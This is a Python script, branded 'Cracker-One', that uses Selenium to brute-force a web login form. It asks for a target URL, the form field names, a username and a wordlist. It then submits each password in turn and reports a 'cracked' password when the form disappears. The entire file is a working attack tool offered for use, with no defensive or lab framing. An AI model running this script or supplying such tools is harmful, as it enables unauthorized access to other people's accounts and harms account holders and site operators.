from selenium import webdriver
from selenium.webdriver.common.by import By
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.common.exceptions import ElementNotInteractableException
from selenium.common.exceptions import StaleElementReferenceException
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains
from colorama import Fore
import os
import time
import selenium

print(f'{Fore.GREEN}')
print(f"""
   ____                _                   ___             
  / ___|_ __ __ _  ___| | _____ _ __      / _ \ _ __   ___ 
 | |   | '__/ _` |/ __| |/ / _ \ '__|____| | | | '_ \ / _ |
 | |___| | | (_| | (__|   <  __/ | |_____| |_| | | | |  __/
  \____|_|  \__,_|\___|_|\_\___|_|        \___/|_| |_|\___|
                                                           """)
print(f'{Fore.RESET}')
print(f'{Fore.RED}'"""[!] The good cracked password can be up to two 
lines before in the wordlist it depends on your internet 
connection, to be sure try the last three tested password
in addition to the one indicated.
"""f'{Fore.RESET}')
time.sleep(1)
input("Press Enter To Continue")
url = input('Enter Url > ')
nameusername = input('Enter NAME of Username Input > ')
namepassword = input('Enter NAME of Password Input > ')
username = input('Enter The USERNAME > ') 
wordl = input('Enter PATH of Wordlist > ')
option = webdriver.ChromeOptions()
show = '' #fill with 'headless' to hide the window
#option.add_argument(show)
driver = webdriver.Chrome(ChromeDriverManager().install(),options=option)
driver.get(url)
file = open(wordl)
bruteforce = []
for line in file:
    line = line.strip()
    bruteforce.append(line)
x = 0
nb = 0
while True :
    try :
        for brute in bruteforce :
            useEnt = driver.find_element(By.NAME, nameusername)
            passEnt = driver.find_element(By.NAME, namepassword)
            x+=1
            nb+=1
            useEnt.send_keys(username)
            passEnt.send_keys(brute)
            passEnt.send_keys(Keys.RETURN)
            passEnt.send_keys(Keys.BACK_SPACE)
            passEnt.send_keys(Keys.BACK_SPACE)
            passEnt.send_keys(Keys.BACK_SPACE)
            passEnt.send_keys(Keys.BACK_SPACE)
            passEnt.send_keys(Keys.BACK_SPACE)
            passEnt.send_keys(Keys.BACK_SPACE)
            passEnt.send_keys(Keys.BACK_SPACE)
            passEnt.send_keys(Keys.BACK_SPACE)
            passEnt.send_keys(Keys.BACK_SPACE)
            passEnt.send_keys(Keys.BACK_SPACE)
            passEnt.send_keys(Keys.BACK_SPACE)
            passEnt.send_keys(Keys.BACK_SPACE)
            passEnt.send_keys(Keys.BACK_SPACE)
            passEnt.send_keys(Keys.BACK_SPACE)
            passEnt.send_keys(Keys.BACK_SPACE)
            passEnt.send_keys(Keys.BACK_SPACE)
            useEnt.send_keys(Keys.BACK_SPACE)
            useEnt.send_keys(Keys.BACK_SPACE)
            useEnt.send_keys(Keys.BACK_SPACE)
            useEnt.send_keys(Keys.BACK_SPACE)
            useEnt.send_keys(Keys.BACK_SPACE)
            useEnt.send_keys(Keys.BACK_SPACE)
            useEnt.send_keys(Keys.BACK_SPACE)
            useEnt.send_keys(Keys.BACK_SPACE)
            useEnt.send_keys(Keys.BACK_SPACE)
            useEnt.send_keys(Keys.BACK_SPACE)
            useEnt.send_keys(Keys.BACK_SPACE)
            print(f'{Fore.RED}X{Fore.RESET}',f'[{Fore.BLUE}ATTEMPT :{Fore.RESET}]',brute)
            if x > 30 :
                os.system('cls||clear')
                x = 0
                print(f'{Fore.RED}X{Fore.RESET}',f'[{Fore.BLUE}ATTEMPT :{Fore.RESET}]',brute)

    except KeyboardInterrupt: # CRTL + C = QUIT
            exit()

    except selenium.common.exceptions.ElementNotInteractableException:
            print(f'{Fore.GREEN}#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#{Fore.RESET}')
            print(f'Password Cracked :',brute)
            print('ATTEMPT :',nb)
            print(f'{Fore.GREEN}#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#{Fore.RESET}')
            quit()
    except selenium.common.exceptions.StaleElementReferenceException:
            print(f'{Fore.GREEN}#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#{Fore.RESET}')
            print(f'Password Cracked :',brute)
            print('ATTEMPT :',nb)
            print(f'{Fore.GREEN}#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#{Fore.RESET}')
            quit()
    except selenium.common.exceptions.NoSuchElementException:
            print(f'{Fore.GREEN}#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#{Fore.RESET}')
            print(f'Password Cracked :',brute)
            print('ATTEMPT :',nb)
            print(f'{Fore.GREEN}#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#{Fore.RESET}')
            quit()
    



